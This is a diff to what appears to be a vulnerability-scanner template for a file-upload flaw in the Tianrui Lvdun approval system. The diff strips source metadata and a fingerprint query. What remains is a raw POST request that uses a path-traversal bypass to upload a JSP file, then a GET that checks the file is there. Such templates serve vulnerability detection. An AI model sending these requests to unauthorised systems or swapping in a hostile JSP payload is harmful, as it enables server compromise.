@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统 uploadWxFile 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qbg8tyk2eifkewmn'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qbg8tyk2eifkewmn
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
   - 'POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1
@@ -39,9 +35,7 @@ http:
 
     <% out.println("HelloWorld");%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711706134-9695a373-338f-4c85-9c75-cfed80af5ee4.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
@@ -50,9 +44,7 @@ http:
 - raw:
   - 'GET /hello.jsp HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711706330-ad080074-92f2-4333-a65e-be1c19193a74.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
